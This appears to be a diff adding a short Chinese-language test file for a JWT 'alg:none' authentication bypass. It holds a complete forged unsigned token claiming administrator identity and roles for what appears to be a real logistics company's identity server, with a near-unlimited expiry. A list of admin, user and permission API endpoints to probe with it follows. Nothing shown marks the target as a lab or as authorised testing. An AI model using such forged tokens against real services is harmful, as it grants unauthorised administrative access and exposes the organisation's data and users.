@@ -1,0 +1,12 @@
+=== 验证JWT alg:none认证绕过漏洞 ===
+伪造的Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.ewogICJpc3MiOiAiaHR0cHM6Ly9hdXRoLWdsb2JhbC52aWV0dGVscG9zdC52bi8iLAogICJleHAiOiA5OTk5OTk5OTk5LAogICJpYXQiOiAxNzYyODY5NjY4LAogICJhdWQiOiAiTG9naXN0ZWsiLAogICJzY29wZSI6ICJMb2dpc3RlayBvcGVuaWQiLAogICJzdWIiOiAiYWRtaW4iLAogICJuYW1lIjogIkFkbWluaXN0cmF0b3IiLAogICJyb2xlcyI6IFsiQWRtaW4iXSwKICAiZW1haWwiOiAiYWRtaW5AdmlldHRlbHBvc3Qudm4iLAogICJjbGllbnRfaWQiOiAiTG9naXN0ZWtfU3dhZ2dlciIKfQ.
+
+[1] 测试需要认证的端点 - /api/identity/users
+
+[2] 测试admin端点 - /api/admin/agency/search
+
+[3] 测试权限管理 - /api/permission-management/permissions
+
+[4] 对比正常token的响应
+
+[5] 测试无token的响应
